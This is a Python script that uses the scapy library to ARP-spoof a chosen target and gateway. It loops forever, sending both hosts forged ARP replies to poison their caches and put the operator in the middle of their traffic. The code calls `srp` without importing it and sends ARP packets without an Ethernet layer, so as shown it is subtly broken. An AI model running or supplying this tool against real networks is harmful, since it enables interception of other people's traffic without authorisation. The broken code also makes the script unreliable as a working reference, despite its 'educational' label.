import argparse
from scapy.all import ARP, Ether, sendp, get_if_hwaddr
import time

def get_mac(ip):
    # Send an ARP request to get the MAC address for the given IP address
    arp_request = ARP(op=1, pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    request_packet = broadcast/arp_request
    response = srp(request_packet, timeout=1, verbose=False)[0]
    
    # Return the MAC address of the first response (it should be the target)
    return response[0][1].hwsrc

def spoof(target_ip, gateway_ip, interface):
    # Get the target's MAC address
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"Starting ARP spoofing. Target: {target_ip}, Gateway: {gateway_ip}.")

    # Construct the ARP reply packet to send to the target
    packet_to_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)

    # Construct the ARP reply packet to send to the gateway
    packet_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

    try:
        while True:
            # Send the packets indefinitely
            sendp(packet_to_target, iface=interface, verbose=False)
            sendp(packet_to_gateway, iface=interface, verbose=False)
            print(f"Sent spoofed ARP packets: Target {target_ip} and Gateway {gateway_ip}.")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nARP Spoofing stopped by user.")

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing for Educational Purposes")
    parser.add_argument("interface", help="Network interface to use (e.g., 'eth0', 'Wi-Fi')")
    parser.add_argument("target_ip", help="Target IP address to spoof")
    parser.add_argument("gateway_ip", help="Gateway IP address to spoof")
    args = parser.parse_args()

    print(f"Using interface: {args.interface}, Target IP: {args.target_ip}, Gateway IP: {args.gateway_ip}")

    # Start ARP spoofing
    spoof(args.target_ip, args.gateway_ip, args.interface)

if __name__ == "__main__":
    main()
